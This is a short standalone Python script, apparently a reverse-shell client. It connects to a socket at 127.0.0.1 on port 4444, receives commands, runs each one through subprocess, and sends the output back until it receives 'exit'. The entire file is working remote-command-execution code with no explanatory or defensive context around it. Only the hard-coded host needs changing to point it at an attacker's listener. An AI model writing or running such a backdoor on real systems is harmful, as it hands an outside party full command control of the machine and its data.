import socket, subprocess

server_ip = "127.0.0.1"
port = 4444

s = socket.socket()
s.connect((server_ip, port))

while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == "exit":
        break
    output = subprocess.getoutput(cmd)
    s.send(output.encode())
